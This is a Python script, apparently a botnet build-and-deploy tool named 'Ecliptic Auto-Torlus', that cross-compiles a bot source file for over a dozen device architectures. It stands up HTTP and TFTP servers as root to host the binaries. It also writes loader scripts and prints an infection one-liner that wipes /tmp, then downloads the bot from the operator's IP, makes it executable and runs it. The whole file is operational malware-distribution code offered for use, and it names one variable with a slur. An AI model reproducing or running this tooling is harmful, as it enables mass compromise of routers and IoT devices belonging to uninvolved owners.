import subprocess, sys

if len(sys.argv[2]) != 0:
    ip = sys.argv[2]
else:
    print("\x1b[0;31mIncorrect Usage!")
    print("\x1b[0;32mUsage: python " + sys.argv[0] + " <BOT.C> <IP> \x1b[0m")

    
bot = sys.argv[1]
sys.stdout.write("\x1b]2;Ecliptic Auto-Torlus\x07")
yourafag = raw_input("Get arch's? Y/n:")
if yourafag.lower() == "y":
    get_arch = True
else:
    get_arch = False

compileas = ["[M]", #mips
             "[MS]", #mipsel
             "[SH]", #sh4
             "[x86]", #x86
             "[A6]", #Armv6l
             "[I6]", #i686
             "[PPC]", #ppc
             "[I5]", #i586
             "[M68]", #m68k
             #"[S]" #sparc
			#"[A4]", #armv4l
			 "[A5]", #armv5l
			 "[PPC-440]", #powerpc-440fp
			 #"[A4-EB]", #armv4eb
			 "[A4-TL]", #armv4tl
			 "[I4]", #i486
			 "[M64]"] #mips64

getarch = ['http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sh4.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-x86_64.tar.bz2',
'http://distro.ibiblio.org/slitaz/sources/packages/c/cross-compiler-armv6l.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i686.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i586.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-m68k.tar.bz2',
#'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sparc.tar.bz2',
#'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv4l.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv5l.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc-440fp.tar.bz2',
#'http://distro.ibiblio.org/slitaz/sources/packages/c/cross-compiler-armv4eb.tar.bz2',
'http://distro.ibiblio.org/slitaz/sources/packages/c/cross-compiler-armv4tl.tar.bz2',
'http://distro.ibiblio.org/slitaz/sources/packages/c/cross-compiler-i486.tar.bz2',
'http://distro.ibiblio.org/slitaz/sources/packages/c/cross-compiler-mips64.tar.bz2']

ccs = ["cross-compiler-mips",
       "cross-compiler-mipsel",
       "cross-compiler-sh4",
       "cross-compiler-x86_64",
       "cross-compiler-armv6l",
       "cross-compiler-i686",
       "cross-compiler-powerpc",
       "cross-compiler-i586",
       "cross-compiler-m68k",
       #"cross-compiler-sparc",
	   #"cross-compiler-armv4l",
	   "cross-compiler-armv5l",
	   "cross-compiler-powerpc-440fp",
	   #"cross-compiler-armv4eb",
	   "cross-compiler-armv4tl",
	   "cross-compiler-i486",
	   "cross-compiler-mips64"]

def run(cmd):
    subprocess.call(cmd, shell=True)

run("rm -rf /var/www/html/* /var/lib/tftpboot/*")

if get_arch == True:
    run("rm -rf cross-compiler-*")

    print("Downloading Architectures")

    for arch in getarch:
        run("wget " + arch + " --no-check-certificate >> /dev/null")
        run("tar -xvf *tar.bz2")
        run("rm -rf *tar.bz2")

    print("Cross Compilers Downloaded...")

num = 0
for cc in ccs:
    arch = cc.split("-")[2]
    run("./"+cc+"/bin/"+arch+"-gcc -static -lpthread -pthread -D" + arch.upper() + " -o " + compileas[num] + " " + bot + " > /dev/null")
    num += 1

print("Cross Compiling Done!")
print("Setting up your httpd and tftp")

run("yum install httpd -y")
run("service httpd start")
run("yum install xinetd tftp tftp-server -y")

run('''echo -e "# default: off
# description: The tftp server serves files using the trivial file transfer \
#       protocol.  The tftp protocol is often used to boot diskless \
#       workstations, download configuration files to network-aware printers, \
#       and to start the installation process for some operating systems.
service tftp
{
        socket_type             = dgram
        protocol                = udp
        wait                    = yes
        user                    = root
        server                  = /usr/sbin/in.tftpd
        server_args             = -s -c /var/lib/tftpboot
        disable                 = no
        per_source              = 11
        cps                     = 100 2
        flags                   = IPv4
}
" > /etc/xinetd.d/tftp''')
run("service xinetd start")

for i in compileas:
    run("cp " + i + " /var/www/html")
    run("mv " + i + " /var/lib/tftpboot")

run('echo -e "ulimit -n 712" > /var/lib/tftpboot/tftp1.sh')
run('echo -e "cp /bin/busybox /tmp/" > /var/lib/tftpboot/tftp1.sh')
run('echo -e "ulimit -n 712" > /var/lib/tftpboot/tftp2.sh')

for i in compileas:
    run('echo -e "cd /tmp; wget http://' + ip + '/' + i + '; chmod 777 ' + i + '; ./' + i + '; rm -rf ' + i + '" >> /var/www/html/bins.sh')
    run('echo -e "cd /tmp; tftp ' + ip + ' -c get ' + i + ';cat ' + i + ' >badbox;chmod +x *;./badbox" >> /var/lib/tftpboot/tftp1.sh')
    run('echo -e "cd /tmp; tftp -r ' + ip + ' -g ' + ip + ';cat ' + i + ' >badbox;chmod +x *;./badbox" >> /var/lib/tftpboot/tftp2.sh')

run("service xinetd restart")
run("service httpd restart")
run('echo -e "ulimit -n 99999" >> ~/.bashrc')

print("\x1b[0;32mSuccessfully cross compiled!\x1b[0m")
print("\x1b[0;32mYour link: cd /tmp && rm -rf * && wget http://" + ip + "/bins.sh || curl -O http://" + ip + "/bins.sh && chmod 777 bins.sh && ./bins.sh && busybox tftp " + ip + " -c get tftp1.sh && chmod 777 tftp1.sh && ./tftp1.sh && busybox tftp -r tftp2.sh -g " + ip + " && chmod 777 tftp2.sh && ./tftp2.sh && rm -rf bins.sh tftp1.sh tftp2.sh\x1b[0m")
print("\x1b[0;32mMade By: Eclipse")
